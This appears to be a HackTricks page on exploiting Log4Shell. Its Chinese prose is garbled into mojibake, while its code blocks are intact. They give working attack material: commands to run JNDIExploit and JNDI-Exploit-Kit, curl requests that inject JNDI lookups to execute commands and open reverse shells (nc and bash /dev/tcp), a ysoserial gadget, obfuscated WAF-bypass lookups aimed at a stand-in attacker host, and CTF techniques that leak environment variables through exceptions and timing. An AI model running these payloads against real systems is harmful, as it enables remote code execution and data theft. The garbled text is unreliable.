**æ³¨æ„ï¼š** è¿™ä¸ªæ¼æ´ä¾èµ–äºJavaçš„é…ç½®ï¼Œå…è®¸é€šè¿‡LDAPåŠ è½½è¿œç¨‹ä»£ç åº“ã€‚å¦‚æœä¸å…è®¸è¿™æ ·åšï¼Œè¯·è€ƒè™‘åˆ©ç”¨å—ä¿¡ä»»çš„ç±»æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

### RCE - **JNDIExploit**

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œç”±äºå‘ç°äº†log4shellï¼Œä½œè€…åœ¨githubä¸Šåˆ é™¤äº†è¿™ä¸ªé¡¹ç›®ã€‚æ‚¨å¯ä»¥åœ¨[https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2)ä¸­æ‰¾åˆ°ç¼“å­˜ç‰ˆæœ¬ï¼Œä½†å¦‚æœæ‚¨å¸Œæœ›å°Šé‡ä½œè€…çš„å†³å®šï¼Œè¯·ä½¿ç”¨å…¶ä»–æ–¹æ³•æ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚

æ­¤å¤–ï¼Œæ‚¨æ— æ³•åœ¨wayback machineä¸­æ‰¾åˆ°æºä»£ç ï¼Œå› æ­¤è¦ä¹ˆåˆ†ææºä»£ç ï¼Œè¦ä¹ˆæ‰§è¡Œjaræ–‡ä»¶ï¼ŒçŸ¥é“æ‚¨ä¸çŸ¥é“è‡ªå·±åœ¨æ‰§è¡Œä»€ä¹ˆã€‚
{% endhint %}

ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥åœ¨ç«¯å£8080ä¸Šè¿è¡Œæ­¤**æ˜“å—log4shellæ¼æ´å½±å“çš„WebæœåŠ¡å™¨**ï¼š[https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)ï¼ˆ_åœ¨è‡ªè¿°æ–‡ä»¶ä¸­æ‚¨å°†æ‰¾åˆ°å¦‚ä½•è¿è¡Œå®ƒçš„è¯´æ˜_ï¼‰ã€‚è¿™ä¸ªæ˜“å—æ”»å‡»çš„åº”ç”¨æ­£åœ¨ä½¿ç”¨æ˜“å—æ”»å‡»ç‰ˆæœ¬çš„log4shellè®°å½•HTTPè¯·æ±‚å¤´_X-Api-Version_çš„å†…å®¹ã€‚

ç„¶åï¼Œæ‚¨å¯ä»¥ä¸‹è½½**JNDIExploit** jaræ–‡ä»¶å¹¶æ‰§è¡Œï¼š
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
åœ¨é˜…è¯»ä»£ç ä»…å‡ åˆ†é’Ÿåï¼Œåœ¨_com.feihong.ldap.LdapServer_å’Œ_com.feihong.ldap.HTTPServer_ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°**LDAPå’ŒHTTPæœåŠ¡å™¨æ˜¯å¦‚ä½•åˆ›å»º**çš„ã€‚LDAPæœåŠ¡å™¨å°†äº†è§£éœ€è¦æä¾›çš„æœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶å°†å—å®³è€…é‡å®šå‘åˆ°HTTPæœåŠ¡å™¨ï¼Œåè€…å°†æä¾›åˆ©ç”¨ã€‚\
åœ¨_com.feihong.ldap.gadgets_ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°**ä¸€äº›ç‰¹å®šçš„å°å·¥å…·**ï¼Œå¯ç”¨äºæ‰§è¡Œæ‰€éœ€çš„æ“ä½œï¼ˆå¯èƒ½æ‰§è¡Œä»»æ„ä»£ç ï¼‰ã€‚åœ¨_com.feihong.ldap.template_ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°å°†**ç”Ÿæˆåˆ©ç”¨**çš„ä¸åŒæ¨¡æ¿ç±»ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨**`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„åˆ©ç”¨ã€‚ä¸€äº›æœ‰ç”¨çš„åˆ©ç”¨åŒ…æ‹¬ï¼š
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
å› æ­¤ï¼Œåœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å·²ç»è¿è¡Œäº†é‚£ä¸ªå­˜åœ¨æ¼æ´çš„ Docker åº”ç”¨ç¨‹åºã€‚è¦å¯¹å…¶å‘åŠ¨æ”»å‡»ï¼š
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
åœ¨å‘é€æ”»å‡»æ—¶ï¼Œæ‚¨å°†åœ¨æ‰§è¡Œ**JNDIExploit-1.2-SNAPSHOT.jar**çš„ç»ˆç«¯ä¸­çœ‹åˆ°ä¸€äº›è¾“å‡ºã€‚

**è®°å¾—æ£€æŸ¥`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`ä»¥è·å–å…¶ä»–åˆ©ç”¨é€‰é¡¹ã€‚æ­¤å¤–ï¼Œå¦‚æœéœ€è¦ï¼Œæ‚¨å¯ä»¥æ›´æ”¹LDAPå’ŒHTTPæœåŠ¡å™¨çš„ç«¯å£ã€‚**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

ç±»ä¼¼äºä¹‹å‰çš„åˆ©ç”¨ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨[JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit)æ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚\
æ‚¨å¯ä»¥ç”Ÿæˆè¦å‘é€ç»™å—å®³è€…çš„URLï¼š
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_è¿™ç§åˆ©ç”¨è‡ªå®šä¹‰ç”Ÿæˆçš„Javaå¯¹è±¡çš„æ”»å‡»åœ¨ç±»ä¼¼**THMå¤ªé˜³æˆ¿é—´**çš„å®éªŒå®¤ä¸­å¯è¡Œã€‚ç„¶è€Œï¼Œé€šå¸¸æƒ…å†µä¸‹ä¸ä¼šç”Ÿæ•ˆï¼ˆå› ä¸ºé»˜è®¤æƒ…å†µä¸‹Javaæœªé…ç½®ä¸ºä½¿ç”¨LDAPåŠ è½½è¿œç¨‹ä»£ç åº“ï¼‰ï¼Œæˆ‘è®¤ä¸ºè¿™æ˜¯å› ä¸ºå®ƒæ²¡æœ‰æ»¥ç”¨å—ä¿¡ä»»çš„ç±»æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚_

### RCE - ysoserial & JNDI-Exploit-Kit

è¿™ä¸ªé€‰é¡¹éå¸¸é€‚ç”¨äºæ”»å‡»**ä»…ä¿¡ä»»æŒ‡å®šç±»è€Œä¸æ˜¯æ‰€æœ‰äººçš„Javaç‰ˆæœ¬**ã€‚å› æ­¤ï¼Œ**ysoserial**å°†è¢«ç”¨æ¥ç”Ÿæˆ**å—ä¿¡ä»»ç±»çš„åºåˆ—åŒ–**ï¼Œè¿™äº›åºåˆ—åŒ–å¯ä»¥è¢«ç”¨ä½œå·¥å…·æ¥**æ‰§è¡Œä»»æ„ä»£ç **ï¼ˆ_ysoserialæ»¥ç”¨çš„å—ä¿¡ä»»ç±»å¿…é¡»è¢«å—å®³è€…Javaç¨‹åºä½¿ç”¨ï¼Œä»¥ä½¿åˆ©ç”¨ç”Ÿæ•ˆ_ï¼‰ã€‚

ä½¿ç”¨**ysoserial**æˆ–[**ysoserial-modified**](https://github.com/pimps/ysoserial-modified)å¯ä»¥åˆ›å»ºååºåˆ—åŒ–åˆ©ç”¨ï¼Œè¯¥åˆ©ç”¨å°†è¢«JNDIä¸‹è½½ï¼š
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
ä½¿ç”¨[JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit)ç”Ÿæˆ**JNDIé“¾æ¥**ï¼Œåœ¨å…¶ä¸­æ¼æ´æœºå™¨çš„è¿æ¥ç­‰å¾…æ¼æ´åˆ©ç”¨ã€‚æ‚¨å¯ä»¥ä½¿ç”¨JNDI-Exploit-Kitè‡ªåŠ¨ç”Ÿæˆçš„**ä¸åŒåˆ©ç”¨ç¨‹åº**ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ‚¨è‡ªå·±æˆ–ysoserialç”Ÿæˆçš„**ååºåˆ—åŒ–æœ‰æ•ˆè½½è·**ã€‚
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

ç°åœ¨ï¼Œæ‚¨å¯ä»¥è½»æ¾ä½¿ç”¨ç”Ÿæˆçš„JNDIé“¾æ¥æ¥åˆ©ç”¨æ¼æ´å¹¶è·å–**åå‘ shell**ï¼Œåªéœ€å‘é€åˆ°ä¸€ä¸ªå—æ¼æ´å½±å“çš„log4jç‰ˆæœ¬ï¼š**`${ldap://10.10.14.10:1389/generated}`**

### ç»•è¿‡æ–¹å¼
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:Ä±}}:ldap://...} //Notice the unicode "i"
```
### è‡ªåŠ¨æ‰«æå™¨

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - æŸ¥æ‰¾æœ¬åœ°æ˜“å—æ”»å‡»çš„åº“

### å®éªŒå®¤æµ‹è¯•

* [**LogForge HTB æœºå™¨**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar room**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Log4Shell æ¼æ´åˆ©ç”¨å

åœ¨è¿™ä¸ª[**CTF writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)ä¸­å¾ˆå¥½åœ°è§£é‡Šäº†å¦‚ä½•**æ»¥ç”¨**Log4Jçš„ä¸€äº›åŠŸèƒ½ã€‚

Log4jçš„[**å®‰å…¨é¡µé¢**](https://logging.apache.org/log4j/2.x/security.html)ä¸­æœ‰ä¸€äº›æœ‰è¶£çš„å¥å­ï¼š

> ä»ç‰ˆæœ¬2.16.0ï¼ˆé€‚ç”¨äºJava 8ï¼‰å¼€å§‹ï¼Œ**æ¶ˆæ¯æŸ¥æ‰¾åŠŸèƒ½å·²å®Œå…¨ç§»é™¤**ã€‚**é…ç½®ä¸­çš„æŸ¥æ‰¾ä»ç„¶æœ‰æ•ˆ**ã€‚æ­¤å¤–ï¼ŒLog4jç°åœ¨é»˜è®¤ç¦ç”¨å¯¹JNDIçš„è®¿é—®ã€‚ç°åœ¨éœ€è¦æ˜¾å¼å¯ç”¨é…ç½®ä¸­çš„JNDIæŸ¥æ‰¾ã€‚

> ä»ç‰ˆæœ¬2.17.0å¼€å§‹ï¼ˆå¯¹äºJava 7å’ŒJava 6åˆ†åˆ«ä¸º2.12.3å’Œ2.3.1ï¼‰ï¼Œ**ä»…åœ¨é…ç½®ä¸­æ‰©å±•æŸ¥æ‰¾å­—ç¬¦ä¸²**ï¼›åœ¨ä»»ä½•å…¶ä»–ç”¨é€”ä¸­ï¼Œä»…è§£æé¡¶çº§æŸ¥æ‰¾ï¼Œå¹¶ä¸”ä¸è§£æä»»ä½•åµŒå¥—æŸ¥æ‰¾ã€‚

è¿™æ„å‘³ç€é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥**å¿˜è®°ä½¿ç”¨ä»»ä½•`jndi`æ¼æ´**ã€‚æ­¤å¤–ï¼Œè¦æ‰§è¡Œ**é€’å½’æŸ¥æ‰¾**ï¼Œæ‚¨éœ€è¦é…ç½®å®ƒä»¬ã€‚

ä¾‹å¦‚ï¼Œåœ¨è¯¥CTFä¸­ï¼Œæ–‡ä»¶log4j2.xmlä¸­é…ç½®å¦‚ä¸‹ï¼š
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### ç¯å¢ƒæŸ¥æ‰¾

åœ¨[è¿™ä¸ªCTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)ä¸­ï¼Œæ”»å‡»è€…æ§åˆ¶äº†`${sys:cmd}`çš„å€¼ï¼Œå¹¶éœ€è¦ä»ç¯å¢ƒå˜é‡ä¸­çªƒå–æ ‡å¿—ã€‚\
å¦‚åœ¨[**ä¹‹å‰çš„æœ‰æ•ˆè½½è·**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification)é¡µé¢ä¸­æ‰€è§ï¼Œæœ‰ä¸åŒçš„æ–¹å¼å¯ä»¥è®¿é—®ç¯å¢ƒå˜é‡ï¼Œæ¯”å¦‚ï¼š**`${env:FLAG}`**ã€‚åœ¨è¿™ä¸ªCTFä¸­è¿™æ˜¯æ— ç”¨çš„ï¼Œä½†åœ¨å…¶ä»–ç°å®åœºæ™¯ä¸­å¯èƒ½ä¼šæœ‰ç”¨ã€‚

### å¼‚å¸¸ä¸­çš„æ•°æ®çªƒå–

åœ¨CTFä¸­ï¼Œä½ **æ— æ³•è®¿é—®javaåº”ç”¨ç¨‹åºçš„stderr**ï¼Œä½†Log4Jçš„**å¼‚å¸¸ä¼šå‘é€åˆ°stdout**ï¼Œè¿™åœ¨pythonåº”ç”¨ç¨‹åºä¸­è¢«æ‰“å°å‡ºæ¥ã€‚è¿™æ„å‘³ç€è§¦å‘å¼‚å¸¸åæˆ‘ä»¬å¯ä»¥è®¿é—®å†…å®¹ã€‚ä¸€ä¸ªç”¨äºçªƒå–æ ‡å¿—çš„å¼‚å¸¸æ˜¯ï¼š**`${java:${env:FLAG}}`**ã€‚è¿™æœ‰æ•ˆæ˜¯å› ä¸º**`${java:CTF{blahblah}}`**ä¸å­˜åœ¨ï¼Œå°†æ˜¾ç¤ºä¸€ä¸ªå…·æœ‰æ ‡å¿—å€¼çš„å¼‚å¸¸ï¼š

![](<../../.gitbook/assets/image (157).png>)

### è½¬æ¢æ¨¡å¼å¼‚å¸¸

ä»…æä¸€ä¸‹ï¼Œä½ ä¹Ÿå¯ä»¥æ³¨å…¥æ–°çš„[**è½¬æ¢æ¨¡å¼**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout)å¹¶è§¦å‘å°†è®°å½•åˆ°`stdout`çš„å¼‚å¸¸ã€‚ä¾‹å¦‚ï¼š

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

è¿™å¹¶æ²¡æœ‰å‘ç°æœ‰ç”¨äºåœ¨é”™è¯¯æ¶ˆæ¯ä¸­çªƒå–æ—¥æœŸï¼Œå› ä¸ºæŸ¥æ‰¾åœ¨è½¬æ¢æ¨¡å¼ä¹‹å‰æœªè§£å†³ï¼Œä½†å¯¹äºå…¶ä»–äº‹æƒ…å¦‚æ£€æµ‹å¯èƒ½ä¼šæœ‰ç”¨ã€‚

### è½¬æ¢æ¨¡å¼æ­£åˆ™è¡¨è¾¾å¼

ç„¶è€Œï¼Œå¯ä»¥ä½¿ç”¨ä¸€äº›æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼çš„**è½¬æ¢æ¨¡å¼**æ¥é€šè¿‡ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å’Œæ»¥ç”¨**äºŒè¿›åˆ¶æœç´¢**æˆ–**åŸºäºæ—¶é—´**çš„è¡Œä¸ºä»æŸ¥æ‰¾ä¸­çªƒå–ä¿¡æ¯ã€‚

* **é€šè¿‡å¼‚å¸¸æ¶ˆæ¯è¿›è¡ŒäºŒè¿›åˆ¶æœç´¢**

è½¬æ¢æ¨¡å¼**`%replace`**å¯ç”¨äº**æ›¿æ¢**å­—ç¬¦ä¸²ä¸­çš„**å†…å®¹**ï¼Œç”šè‡³ä½¿ç”¨**æ­£åˆ™è¡¨è¾¾å¼**ã€‚å®ƒçš„å·¥ä½œæ–¹å¼å¦‚ä¸‹ï¼š`replace{pattern}{regex}{substitution}`\
æ»¥ç”¨è¿™ç§è¡Œä¸ºï¼Œä½ å¯ä»¥ä½¿æ›¿æ¢**å¦‚æœæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…**å­—ç¬¦ä¸²ä¸­çš„ä»»ä½•å†…å®¹åˆ™è§¦å‘å¼‚å¸¸ï¼ˆå¦‚æœæœªæ‰¾åˆ°åˆ™ä¸ä¼šæœ‰å¼‚å¸¸ï¼‰ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **åŸºäºæ—¶é—´çš„æ”»å‡»**

æ­£å¦‚å‰ä¸€èŠ‚ä¸­æåˆ°çš„ï¼Œ**`%replace`** æ”¯æŒ **æ­£åˆ™è¡¨è¾¾å¼**ã€‚å› æ­¤ï¼Œå¯ä»¥ä½¿ç”¨æ¥è‡ª[**ReDoSé¡µé¢**](../regular-expression-denial-of-service-redos.md)çš„æœ‰æ•ˆè½½è·ï¼Œåœ¨æ‰¾åˆ°æ ‡å¿—æ—¶å¼•å‘**è¶…æ—¶**ã€‚\
ä¾‹å¦‚ï¼Œåƒ `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` è¿™æ ·çš„æœ‰æ•ˆè½½è·ä¼šåœ¨é‚£ä¸ªCTFæ¯”èµ›ä¸­è§¦å‘**è¶…æ—¶**ã€‚

åœ¨è¿™ä¸ª[**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)ä¸­ï¼Œå®ƒæ²¡æœ‰ä½¿ç”¨ ReDoS æ”»å‡»ï¼Œè€Œæ˜¯ä½¿ç”¨äº†**æ”¾å¤§æ”»å‡»**æ¥å¯¼è‡´å“åº”ä¸­çš„æ—¶é—´å·®å¼‚ï¼š

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> å¦‚æœæ ‡å¿—ä»¥ `flagGuess` å¼€å¤´ï¼Œæ•´ä¸ªæ ‡å¿—å°†è¢«æ›¿æ¢ä¸º 29 ä¸ª `#`ï¼ˆæˆ‘ä½¿ç”¨è¿™ä¸ªå­—ç¬¦æ˜¯å› ä¸ºå®ƒå¯èƒ½ä¸æ˜¯æ ‡å¿—çš„ä¸€éƒ¨åˆ†ï¼‰ã€‚ **ç„¶åï¼Œæ¯ä¸ªç”Ÿæˆçš„ 29 ä¸ª `#` éƒ½ä¼šè¢«æ›¿æ¢ä¸º 54 ä¸ª `#`**ã€‚ è¿™ä¸ªè¿‡ç¨‹é‡å¤è¿›è¡Œ **6 æ¬¡**ï¼Œæ€»å…±äº§ç”Ÿäº† ` 29*54*54^6* =`` `` `**`96816014208`** **`#`ï¼**
>
> æ›¿æ¢è¿™ä¹ˆå¤š `#` ä¼šè§¦å‘ Flask åº”ç”¨ç¨‹åºçš„ 10 ç§’è¶…æ—¶ï¼Œä»è€Œå¯¼è‡´å‘ç”¨æˆ·å‘é€ HTTP çŠ¶æ€ç  500ã€‚ï¼ˆå¦‚æœæ ‡å¿—ä¸ä»¥ `flagGuess` å¼€å¤´ï¼Œæˆ‘ä»¬å°†æ”¶åˆ°é 500 çŠ¶æ€ç ï¼‰

## å‚è€ƒèµ„æ–™

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs**](https://opensea.io/collection/the-peass-family) æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬**ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
